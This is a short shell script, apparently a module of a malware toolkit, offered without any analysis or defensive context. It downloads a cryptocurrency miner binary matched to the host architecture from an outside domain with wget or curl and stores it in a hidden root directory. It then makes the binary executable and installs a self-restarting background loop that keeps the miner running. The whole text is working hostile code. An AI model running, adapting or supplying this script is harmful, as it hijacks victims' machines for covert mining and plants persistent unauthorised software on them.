wget flamecord.tk/miner-`uname -m` -O /.__EL_SNEEDIO__/miner || curl -L flamecord.tk/miner-`uname -m` -o /.__EL_SNEEDIO__/miner
if ! test -f /.__EL_SNEEDIO__/miner; then
    echo could not download miner
    echo END
    exit
fi
chmod +x /.__EL_SNEEDIO__/miner

cat > /.__EL_SNEEDIO__/modules.d/miner <<EOF
if test -f /.__EL_SNEEDIO__/miner.pid && test -d /proc/`cat /.__EL_SNEEDIO__/miner.pid`; then
    exit
fi
while true; do
    /.__EL_SNEEDIO__/miner
done &
echo $! > /.__EL_SNEEDIO__/miner.pid
EOF

sh /.__EL_SNEEDIO__/modules.d/miner

echo suckies
echo END
